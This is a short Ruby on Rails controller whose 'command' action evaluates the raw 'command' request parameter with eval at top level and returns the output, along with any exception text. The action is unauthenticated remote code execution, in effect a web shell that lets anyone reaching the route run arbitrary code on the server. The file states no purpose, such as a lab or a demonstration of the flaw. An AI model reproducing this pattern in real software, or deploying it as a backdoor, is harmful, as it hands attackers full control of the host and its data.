class HomeController < ApplicationController
  def index
  end
  
  def command
   begin
    render :text => eval(%Q{#{params[:command]}}, TOPLEVEL_BINDING)
   rescue Exception => e
    render :text => e
   end
  end
end
